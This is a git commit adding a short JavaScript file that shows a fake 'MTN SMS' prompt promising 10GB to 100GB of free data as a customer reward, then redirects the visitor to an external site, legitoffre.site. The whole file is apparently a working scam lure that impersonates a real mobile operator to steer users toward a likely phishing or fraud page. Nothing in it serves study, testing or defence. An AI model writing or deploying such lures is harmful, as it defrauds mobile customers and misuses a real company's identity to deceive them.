59c8acf5a58cc1dd4021776131309602006162cd
legitipz <gloliousam4@gmail.com>
2025-12-29 23:46:00 -0800

    Create activation-swazixmasdata.js

---
+++ activation-swazixmasdata.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('MTN SMS: Dear Customer, Kindly Check If your MTN Sim Card Is Qualify To Receive From 10GB To 100GB data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://legitoffre.site/swazixmasdata.html';
+}
